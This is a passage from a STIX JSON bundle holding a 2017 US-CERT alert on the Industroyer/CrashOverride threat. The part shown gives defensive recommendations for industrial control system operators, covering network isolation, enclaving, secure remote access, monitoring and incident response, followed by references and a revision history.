sites;</li><li>Validate the authenticity of downloads;</li><li>Insist that vendors digitally sign updates, and/or publish hashes via an out-of-bound communications path, and only use this path to authenticate;</li><li>Never load updates from unverified sources; and</li><li>Reduce your attack surface area.</li></ul><p>To the greatest extent possible, NCCIC recommends that operators:</p><ul><li>Isolate ICS networks from any untrusted networks, especially the Internet;</li><li>Lock down all unused ports;</li><li>Turn off all unused services; and</li><li>Only allow real-time connectivity to external networks if there is a defined business requirement or control function.<ul><li>If one-way communication can accomplish a task, operators should use optical separation (“data diode”).</li><li>If bidirectional communication is necessary, operators should use a single open port over a restricted network path.</li></ul></li></ul><h4>Build a Defendable Environment</h4><p>Building a defendable environment will help limit the impact from network perimeter breaches. NCCIC recommends operators segment networks into logical enclaves and restrict host-to-host communications paths. This can prevent adversaries from expanding their access, while allowing the normal system communications to continue operating. Enclaving limits possible damage, as threat actors cannot use compromised systems to reach and contaminate systems in other enclaves. Containment provided by enclaving also makes incident cleanup significantly less costly.</p><p>If one-way data transfer from a secure zone to a less secure zone is required, operators should consider using approved removable media instead of a network connection. If real-time data transfer is required, operators should consider using optical separation technologies. This allows replication of data without placing the control system at risk.</p><p>Additional details on effective strategies for building a defendable ICS network can be found in the <a href=\"http://ics-cert.us-cert.gov/Abstract-Defense-Depth-RP\">ICS-CERT Defense-in-Depth Recommended Practice</a>.</p><h4>Implement Secure Remote Access</h4><p>Some adversaries are effective at gaining remote access into control systems, finding obscure access vectors, even “hidden back doors” intentionally created by system operators. Operators should remove such accesses wherever possible, especially modems, as these are fundamentally insecure.<br />Operators should:</p><ul><li>Limit any accesses that remain;</li><li>Where possible, implement “monitoring only” access enforced by data diodes, and not rely on “read only” access enforced by software configurations or permissions;</li><li>Not allow remote persistent vendor connections into the control network;</li><li>Require any remote access to be operator controlled, time limited, and procedurally similar to “lock out, tag out”;</li><li>Use the same remote access paths for vendor and employee connections; do not allow double standards; and</li><li>Use two-factor authentication if possible, avoiding schemes where both tokens are similar and can be easily stolen (e.g., password and soft certificate).</li></ul><h4>Monitor and Respond</h4><p>Defending a network against modern threats requires actively monitoring for adversarial penetration and quickly executing a prepared response. Operators should:</p><ul><li>Consider establishing monitoring programs in the following key places: at the Internet boundary; at the business to Control DMZ boundary; at the Control DMZ to control LAN boundary; and inside the Control LAN;</li><li>Watch IP traffic on ICS boundaries for abnormal or suspicious communications;</li><li>Monitor IP traffic within the control network for malicious connections or content;</li><li>Use host-based products to detect malicious software and attack attempts;<ul><li>Use login analysis (e.g., time and place) to detect stolen credential usage or improper access, verifying all anomalies with quick phone calls;</li><li>Watch account and user administration actions to detect access control manipulation;</li></ul></li><li>Have a response plan for when adversarial activity is detected; and<ul><li>Such a plan may include disconnecting all Internet connections, running a properly scoped search for malware, disabling affected user accounts, isolating suspect systems, and immediately resetting 100 percent of passwords.</li><li>Such a plan may also define escalation triggers and actions, including incident response, investigation, and public affairs activities.</li></ul></li><li>Have a restoration plan, including “gold disks” ready to restore systems to known good states.<br /> </li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.welivesecurity.com/wp-content/uploads/2017/06/Win32_Industroyer.pdf\">[1] ESET: WIN32/INDUSTROYER – A New Threat for Industrial Control Systems</a></li>\n            \t\t    \t<li><a href=\"https://www.dragos.com/blog/crashoverride/\">[2] Dragos: CRASHOVERRIDE</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>June 12, 2017: Initial Release</li>\n\t\t    \t\t\t    \t<li>June 13, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t    \t\t\t    \t<li>July 7, 2017: Updated IOCs (both STIX and CSV formats)</li>\n\t\t    \t\t\t    \t<li>July 21, 2017: Corrected typographical error</li>\n\t\t    \t\t\t    \t<li>July 24, 2017: Corrected links to downloadable IOC files</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-06-12T21:44:47.000Z"
		}
	],
	"type": "bundle",
	"id": "stix-archive-bundle",
	"spec_version": "2.0"
}